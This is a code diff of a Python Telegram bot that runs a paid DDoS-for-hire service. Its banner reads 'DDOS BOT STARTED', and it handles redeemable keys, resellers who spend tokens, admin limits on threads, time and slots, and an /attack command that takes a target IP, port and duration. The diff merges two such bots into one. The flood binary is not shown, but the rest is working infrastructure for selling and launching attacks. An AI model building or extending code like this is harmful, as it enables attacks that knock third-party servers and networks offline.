+    key, error = generate_reseller_key(uid, duration)
+    if error:
+        send_msg(chat_id, error)
+    else:
+        price = KEY_PRICES.get(duration, 0)
+        send_msg(chat_id, f"✅ Key Generated!\n🔑 {key}\n💰 Tokens used: {price}")
+
+def handle_delkey_callback(chat_id, uid, data, msg_id):
+    if not is_reseller(uid):
+        send_msg(chat_id, "❌ Only for resellers!")
+        return
+    try:
+        del_msg(chat_id, msg_id)
+    except:
+        pass
+    if data.startswith("delkey_"):
+        key = data.replace("delkey_", "")
+        if delete_key(key):
+            send_msg(chat_id, f"✅ Key deleted: {key}")
+        else:
+            send_msg(chat_id, "❌ Key not found!")
+    elif data == "delkey_cancel":
+        send_msg(chat_id, "❌ Cancelled!")
+
+def handle_admin_del_callback(chat_id, uid, data, msg_id):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    try:
+        del_msg(chat_id, msg_id)
+    except:
+        pass
+    count = 0
+    if data == "admin_del_unused":
+        for k, v in list(keys.items()):
+            if not v['used'] and not v.get('blocked', False):
+                del keys[k]
+                count += 1
+        save()
+        send_msg(chat_id, f"✅ Deleted {count} unused keys!")
+    elif data == "admin_del_used":
+        for k, v in list(keys.items()):
+            if v['used']:
+                del keys[k]
+                count += 1
+        save()
+        send_msg(chat_id, f"✅ Deleted {count} used keys!")
+    elif data == "admin_del_all":
+        keys.clear()
+        for rid in resellers:
+            if 'keys_generated' in resellers[rid]:
+                resellers[rid]['keys_generated'] = []
+        save()
+        send_msg(chat_id, "✅ Deleted all keys!")
+    else:
+        send_msg(chat_id, "❌ Cancelled!")
+
 def main():
-    load_users1()
-    load_users2()
-    load_keys1()
-    load_keys2()
-    load_groups1()
-    load_groups2()
-    load_resellers1()
-    load_resellers2()
-    load_attack_count1()
-    load_attack_count2()
-    compile_binary()
+    global last_id
+    load()
+    add_user(ADMIN_ID, 365, 0)
+    check_binary()
     
-    print("="*60)
-    print("  🔥 BOTH DDOS BOTS STARTED 🔥")
-    print("="*60)
-    print(f"🤖 BOT 1: @TG_ROLEX (Admins: {ADMIN1})")
-    print(f"🤖 BOT 2: @TG_DEVILOP (Admins: {ADMIN2})")
-    print("="*60)
-    print("✅ INSTANT REPLY MODE ACTIVE")
-    print("="*60)
-    
-    last_id1 = 0
-    last_id2 = 0
-    waiting1 = {}
-    waiting2 = {}
+    print("""
+    ╔══════════════════════════════════════╗
+    ║   ⚡ DDOS BOT STARTED ⚡              ║
+    ║   Owner: @TG_DEVILOP                 ║
+    ╚══════════════════════════════════════╝
+    """)
     
     while True:
         try:
-            # Bot 1 updates
-            url1 = f"https://api.telegram.org/bot{TOKEN1}/getUpdates?offset={last_id1+1}&timeout=1"
-            r1 = requests.get(url1, timeout=2)
-            data1 = r1.json()
+            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id+1}&timeout=10"
+            r = requests.get(url, timeout=15)
+            data = r.json()
             
-            for update in data1.get("result", []):
-                last_id1 = update["update_id"]
+            for update in data.get("result", []):
+                last_id = update["update_id"]
+                
+                callback = update.get("callback_query")
+                if callback:
+                    callback_id = callback["id"]
+                    chat_id = callback["message"]["chat"]["id"]
+                    uid = callback["from"]["id"]
+                    cb_data = callback["data"]
+                    msg_id = callback["message"]["message_id"]
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", data={"callback_query_id": callback_id})
+                    
+                    if cb_data.startswith("genkey_"):
+                        handle_genkey_callback(chat_id, uid, cb_data, msg_id)
+                    elif cb_data.startswith("confirm_"):
+                        handle_confirm_callback(chat_id, uid, cb_data, msg_id)
+                    elif cb_data.startswith("delkey_"):
+                        handle_delkey_callback(chat_id, uid, cb_data, msg_id)
+                    elif cb_data.startswith("admin_del_"):
+                        handle_admin_del_callback(chat_id, uid, cb_data, msg_id)
+                    continue
+                
                 msg = update.get("message")
                 if not msg:
                     continue
@@ -1861,374 +1349,97 @@ def main():
                 uid = msg["from"]["id"]
                 text = msg.get("text", "")
                 
-                if not text:
+                video = msg.get("video")
+                if video:
+                    handle_video(chat_id, uid, video["file_id"])
                     continue
-                
-                cmd = text.lower()
-                
-                # Check waiting states
-                if waiting1.get(chat_id) == "attack":
-                    handle_attack_input1(chat_id, uid, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "redeem":
-                    handle_redeem1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "adduser":
-                    handle_adduser1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "removeuser":
-                    handle_removeuser1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "addgroup":
-                    handle_addgroup1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "removegroup":
-                    handle_removegroup1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "addreseller":
-                    handle_addreseller1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "removereseller":
-                    handle_removereseller1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "setthreads":
-                    handle_setthreads1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "settime":
-                    handle_settime1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "setslots":
-                    handle_setslots1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "setcooldown":
-                    handle_setcooldown1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "setdaily":
-                    handle_setdaily1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "gen":
-                    handle_gen1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "blockkey":
-                    handle_blockkey1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "unblockkey":
-                    handle_unblockkey1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "broadcast":
-                    handle_broadcast1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "unlimited":
-                    handle_unlimited1(chat_id, text)
-                    waiting1[chat_id] = False
-                elif waiting1.get(chat_id) == "limited":
-                    handle_limited1(chat_id, text)
-                    waiting1[chat_id] = False
-                else:
-                    # Command handling
-                    if cmd == "/start":
-                        handle_start1(chat_id, uid)
-                    elif cmd == "/attack":
-                        waiting1[chat_id] = "attack"
-                        send_msg(TOKEN1, chat_id, "Send: IP PORT TIME\nExample: 1.2.3.4 80 30")
-                    elif cmd == "/stop":
-                        handle_stop1(chat_id)
-                    elif cmd == "/id":
-                        handle_id1(chat_id, uid)
-                    elif cmd == "/redeem":
-                        waiting1[chat_id] = "redeem"
-                        send_msg(TOKEN1, chat_id, "Enter your redemption key")
-                    elif cmd == "/adduser":
-                        waiting1[chat_id] = "adduser"
-                        send_msg(TOKEN1, chat_id, "Send: USER_ID DAYS\nExample: 123456789 7")
-                    elif cmd == "/removeuser":
-                        waiting1[chat_id] = "removeuser"
-                        send_msg(TOKEN1, chat_id, "Send USER_ID to remove")
-                    elif cmd == "/addgroup":
-                        waiting1[chat_id] = "addgroup"
-                        send_msg(TOKEN1, chat_id, "Send: GROUP_ID DAYS\nExample: -100123456789 7")
-                    elif cmd == "/removegroup":
-                        waiting1[chat_id] = "removegroup"
-                        send_msg(TOKEN1, chat_id, "Send GROUP ID to remove")
-                    elif cmd == "/addreseller":
-                        waiting1[chat_id] = "addreseller"
-                        send_msg(TOKEN1, chat_id, "Send: USER_ID TOKENS\nExample: 123456789 100")
-                    elif cmd == "/removereseller":
-                        waiting1[chat_id] = "removereseller"
-                        send_msg(TOKEN1, chat_id, "Send USER ID to remove")
-                    elif cmd == "/setthreads":
-                        waiting1[chat_id] = "setthreads"
-                        send_msg(TOKEN1, chat_id, "Send threads count (100-5000)")
-                    elif cmd == "/settime":
-                        waiting1[chat_id] = "settime"
-                        send_msg(TOKEN1, chat_id, "Send max time (60-600 seconds)")
-                    elif cmd == "/setslots":
-                        waiting1[chat_id] = "setslots"
-                        send_msg(TOKEN1, chat_id, "Send slots count (1-200)")
-                    elif cmd == "/setcooldown":
-                        waiting1[chat_id] = "setcooldown"
-                        send_msg(TOKEN1, chat_id, "Send cooldown seconds (0-600)")
-                    elif cmd == "/setdaily":
-                        waiting1[chat_id] = "setdaily"
-                        send_msg(TOKEN1, chat_id, "Send daily limit (1-1000)")
-                    elif cmd == "/gen":
-                        waiting1[chat_id] = "gen"
-                        send_msg(TOKEN1, chat_id, "Send: PREFIX DURATION\nExample: ROLEX 7d")
-                    elif cmd == "/keys":
-                        handle_keys1(chat_id)
-                    elif cmd == "/deletekeys":
-                        handle_deletekeys1(chat_id)
-                    elif cmd == "/blockkey":
-                        waiting1[chat_id] = "blockkey"
-                        send_msg(TOKEN1, chat_id, "Send key to block")
-                    elif cmd == "/unblockkey":
-                        waiting1[chat_id] = "unblockkey"
-                        send_msg(TOKEN1, chat_id, "Send key to unblock")
-                    elif cmd == "/broadcast":
-                        waiting1[chat_id] = "broadcast"
-                        send_msg(TOKEN1, chat_id, "Send message to broadcast")
-                    elif cmd == "/lock":
-                        handle_lock1(chat_id)
-                    elif cmd == "/unlock":
-                        handle_unlock1(chat_id)
-                    elif cmd == "/unlimited":
-                        waiting1[chat_id] = "unlimited"
-                        send_msg(TOKEN1, chat_id, "Send reseller ID to make unlimited")
-                    elif cmd == "/limited":
-                        waiting1[chat_id] = "limited"
-                        send_msg(TOKEN1, chat_id, "Send: ID TOKENS\nExample: 123456789 50")
-                    elif cmd == "/genkey":
-                        if is_reseller1(uid):
-                            handle_genkey_reseller1(chat_id, uid)
-                        else:
-                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
-                    elif cmd == "/mykeys":
-                        if is_reseller1(uid):
-                            handle_mykeys1(chat_id, uid)
-                        else:
-                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
-                    elif cmd == "/deletekey":
-                        if is_reseller1(uid):
-                            waiting1[chat_id] = "deletekey"
-                            send_msg(TOKEN1, chat_id, "Send key to delete")
-                        else:
-                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
-                    elif cmd == "/blockkey_reseller":
-                        if is_reseller1(uid):
-                            waiting1[chat_id] = "blockkey_reseller"
-                            send_msg(TOKEN1, chat_id, "Send key to block")
-                        else:
-                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
-                    elif cmd == "/unblockkey_reseller":
-                        if is_reseller1(uid):
-                            waiting1[chat_id] = "unblockkey_reseller"
-                            send_msg(TOKEN1, chat_id, "Send key to unblock")
-                        else:
-                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
-                    elif cmd == "/myblockedkeys":
-                        if is_reseller1(uid):
-                            handle_myblockedkeys1(chat_id, uid)
-                        else:
-                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
-                    elif cmd == "/resellers":
-                        handle_resellers1(chat_id)
-                    elif cmd == "/help":
-                        handle_help1(chat_id)
-                    elif cmd == "/rules":
-                        handle_rules1(chat_id)
-            
-            # Bot 2 updates (same structure)
-            url2 = f"https://api.telegram.org/bot{TOKEN2}/getUpdates?offset={last_id2+1}&timeout=1"
-            r2 = requests.get(url2, timeout=2)
-            data2 = r2.json()
-            
-            for update in data2.get("result", []):
-                last_id2 = update["update_id"]
-                msg = update.get("message")
-                if not msg:
-                    continue
-                chat_id = msg["chat"]["id"]
-                uid = msg["from"]["id"]
-                text = msg.get("text", "")
                 
                 if not text:
                     continue
                 
-                cmd = text.lower()
+                parts = text.split()
+                cmd = parts[0].lower()
+                args = parts[1:] if len(parts) > 1 else []
                 
-                if waiting2.get(chat_id) == "attack":
-                    handle_attack_input2(chat_id, uid, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "redeem":
-                    handle_redeem2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "adduser":
-                    handle_adduser2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "removeuser":
-                    handle_removeuser2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "addgroup":
-                    handle_addgroup2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "removegroup":
-                    handle_removegroup2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "addreseller":
-                    handle_addreseller2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "removereseller":
-                    handle_removereseller2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "setthreads":
-                    handle_setthreads2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "settime":
-                    handle_settime2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "setslots":
-                    handle_setslots2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "setcooldown":
-                    handle_setcooldown2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "setdaily":
-                    handle_setdaily2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "gen":
-                    handle_gen2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "blockkey":
-                    handle_blockkey2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "unblockkey":
-                    handle_unblockkey2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "broadcast":
-                    handle_broadcast2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "unlimited":
-                    handle_unlimited2(chat_id, text)
-                    waiting2[chat_id] = False
-                elif waiting2.get(chat_id) == "limited":
-                    handle_limited2(chat_id, text)
-                    waiting2[chat_id] = False
-                else:
-                    if cmd == "/start":
-                        handle_start2(chat_id, uid)
-                    elif cmd == "/attack":
-                        waiting2[chat_id] = "attack"
-                        send_msg(TOKEN2, chat_id, "Send: IP PORT TIME\nExample: 1.2.3.4 80 30")
-                    elif cmd == "/stop":
-                        handle_stop2(chat_id)
-                    elif cmd == "/id":
-                        handle_id2(chat_id, uid)
-                    elif cmd == "/redeem":
-                        waiting2[chat_id] = "redeem"
-                        send_msg(TOKEN2, chat_id, "Enter your redemption key")
-                    elif cmd == "/adduser":
-                        waiting2[chat_id] = "adduser"
-                        send_msg(TOKEN2, chat_id, "Send: USER_ID DAYS\nExample: 123456789 7")
-                    elif cmd == "/removeuser":
-                        waiting2[chat_id] = "removeuser"
-                        send_msg(TOKEN2, chat_id, "Send USER_ID to remove")
-                    elif cmd == "/addgroup":
-                        waiting2[chat_id] = "addgroup"
-                        send_msg(TOKEN2, chat_id, "Send: GROUP_ID DAYS\nExample: -100123456789 7")
-                    elif cmd == "/removegroup":
-                        waiting2[chat_id] = "removegroup"
-                        send_msg(TOKEN2, chat_id, "Send GROUP ID to remove")
-                    elif cmd == "/addreseller":
-                        waiting2[chat_id] = "addreseller"
-                        send_msg(TOKEN2, chat_id, "Send: USER_ID TOKENS\nExample: 123456789 100")
-                    elif cmd == "/removereseller":
-                        waiting2[chat_id] = "removereseller"
-                        send_msg(TOKEN2, chat_id, "Send USER ID to remove")
-                    elif cmd == "/setthreads":
-                        waiting2[chat_id] = "setthreads"
-                        send_msg(TOKEN2, chat_id, "Send threads count (100-5000)")
-                    elif cmd == "/settime":
-                        waiting2[chat_id] = "settime"
-                        send_msg(TOKEN2, chat_id, "Send max time (60-600 seconds)")
-                    elif cmd == "/setslots":
-                        waiting2[chat_id] = "setslots"
-                        send_msg(TOKEN2, chat_id, "Send slots count (1-200)")
-                    elif cmd == "/setcooldown":
-                        waiting2[chat_id] = "setcooldown"
-                        send_msg(TOKEN2, chat_id, "Send cooldown seconds (0-600)")
-                    elif cmd == "/setdaily":
-                        waiting2[chat_id] = "setdaily"
-                        send_msg(TOKEN2, chat_id, "Send daily limit (1-1000)")
-                    elif cmd == "/gen":
-                        waiting2[chat_id] = "gen"
-                        send_msg(TOKEN2, chat_id, "Send: PREFIX DURATION\nExample: DEVIL 7d")
-                    elif cmd == "/keys":
-                        handle_keys2(chat_id)
-                    elif cmd == "/deletekeys":
-                        handle_deletekeys2(chat_id)
-                    elif cmd == "/blockkey":
-                        waiting2[chat_id] = "blockkey"
-                        send_msg(TOKEN2, chat_id, "Send key to block")
-                    elif cmd == "/unblockkey":
-                        waiting2[chat_id] = "unblockkey"
-                        send_msg(TOKEN2, chat_id, "Send key to unblock")
-                    elif cmd == "/broadcast":
-                        waiting2[chat_id] = "broadcast"
-                        send_msg(TOKEN2, chat_id, "Send message to broadcast")
-                    elif cmd == "/lock":
-                        handle_lock2(chat_id)
-                    elif cmd == "/unlock":
-                        handle_unlock2(chat_id)
-                    elif cmd == "/unlimited":
-                        waiting2[chat_id] = "unlimited"
-                        send_msg(TOKEN2, chat_id, "Send reseller ID to make unlimited")
-                    elif cmd == "/limited":
-                        waiting2[chat_id] = "limited"
-                        send_msg(TOKEN2, chat_id, "Send: ID TOKENS\nExample: 123456789 50")
-                    elif cmd == "/genkey":
-                        if is_reseller2(uid):
-                            handle_genkey_reseller2(chat_id, uid)
-                        else:
-                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
-                    elif cmd == "/mykeys":
-                        if is_reseller2(uid):
-                            handle_mykeys2(chat_id, uid)
-                        else:
-                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
-                    elif cmd == "/deletekey":
-                        if is_reseller2(uid):
-                            waiting2[chat_id] = "deletekey"
-                            send_msg(TOKEN2, chat_id, "Send key to delete")
-                        else:
-                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
-                    elif cmd == "/blockkey_reseller":
-                        if is_reseller2(uid):
-                            waiting2[chat_id] = "blockkey_reseller"
-                            send_msg(TOKEN2, chat_id, "Send key to block")
-                        else:
-                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
-                    elif cmd == "/unblockkey_reseller":
-                        if is_reseller2(uid):
-                            waiting2[chat_id] = "unblockkey_reseller"
-                            send_msg(TOKEN2, chat_id, "Send key to unblock")
-                        else:
-                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
-                    elif cmd == "/myblockedkeys":
-                        if is_reseller2(uid):
-                            handle_myblockedkeys2(chat_id, uid)
-                        else:
-                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
-                    elif cmd == "/resellers":
-                        handle_resellers2(chat_id)
-                    elif cmd == "/help":
-                        handle_help2(chat_id)
-                    elif cmd == "/rules":
-                        handle_rules2(chat_id)
+                if cmd == "/start":
+                    handle_start(chat_id, uid, chat_id)
+                elif cmd == "/help":
+                    handle_help(chat_id, uid, chat_id)
+                elif cmd == "/rules":
+                    handle_rules(chat_id)
+                elif cmd == "/id":
+                    handle_id(chat_id, uid, chat_id)
+                elif cmd == "/redeem":
+                    handle_redeem(chat_id, uid, args)
+                elif cmd == "/genkey":
+                    handle_genkey_reseller(chat_id, uid)
+                elif cmd == "/deletekey":
+                    handle_deletekey_reseller(chat_id, uid)
+                elif cmd == "/blockkey":
+                    if is_reseller(uid):
+                        handle_blockkey_reseller(chat_id, uid, args)
+                    elif uid == ADMIN_ID:
+                        handle_blockkey_admin(chat_id, uid, args)
+                    else:
+                        send_msg(chat_id, "❌ Admin or Reseller only!")
+                elif cmd == "/unblockkey":
+                    if is_reseller(uid):
+                        handle_unblockkey_reseller(chat_id, uid, args)
+                    elif uid == ADMIN_ID:
+                        handle_unblockkey_admin(chat_id, uid, args)
+                    else:
+                        send_msg(chat_id, "❌ Admin or Reseller only!")
+                elif cmd == "/myblockedkeys":
+                    handle_myblockedkeys(chat_id, uid)
+                elif cmd == "/deletekeys":
+                    handle_deletekeys_admin(chat_id, uid)
+                elif cmd == "/setthreads":
+                    handle_setthreads(chat_id, uid, args)
+                elif cmd == "/settime":
+                    handle_settime(chat_id, uid, args)
+                elif cmd == "/setslots":
+                    handle_setslots(chat_id, uid, args)
+                elif cmd == "/setcooldown":
+                    handle_setcooldown(chat_id, uid, args)
+                elif cmd == "/setdaily":
+                    handle_setdaily(chat_id, uid, args)
+                elif cmd == "/lock":
+                    handle_lock(chat_id, uid, args)
+                elif cmd == "/unlock":
+                    handle_unlock(chat_id, uid, args)
+                elif cmd == "/unlimited":
+                    handle_unlimited(chat_id, uid, args)
+                elif cmd == "/limited":
+                    handle_limited(chat_id, uid, args)
+                elif cmd == "/gen":
+                    handle_gen_admin(chat_id, uid, args)
+                elif cmd == "/keys":
+                    handle_keys(chat_id, uid, args)
+                elif cmd == "/adduser":
+                    handle_adduser(chat_id, uid, args)
+                elif cmd == "/removeuser":
+                    handle_removeuser(chat_id, uid, args)
+                elif cmd == "/addgroup":
+                    handle_addgroup(chat_id, uid, args)
+                elif cmd == "/removegroup":
+                    handle_removegroup(chat_id, uid, args)
+                elif cmd == "/addreseller":
+                    handle_addreseller(chat_id, uid, args)
+                elif cmd == "/removereseller":
+                    handle_removereseller(chat_id, uid, args)
+                elif cmd == "/resellers":
+                    handle_resellers(chat_id, uid, args)
+                elif cmd == "/attack":
+                    handle_attack(chat_id, uid, chat_id, args)
+                elif cmd == "/stop":
+                    handle_stop(chat_id, uid, chat_id)
+                elif cmd == "/delvideo":
+                    handle_delvideo(chat_id, uid)
             
-            # No sleep - instant response
+            time.sleep(1)
         except Exception as e:
             print(f"Error: {e}")
-            time.sleep(0.5)
+            time.sleep(3)
 
 if __name__ == "__main__":
     main()
